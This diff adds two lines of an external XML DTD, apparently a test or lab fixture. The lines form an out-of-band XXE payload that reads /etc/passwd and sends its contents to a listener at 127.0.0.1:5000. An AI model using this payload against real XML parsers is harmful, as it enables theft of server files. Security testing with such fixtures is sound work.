@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
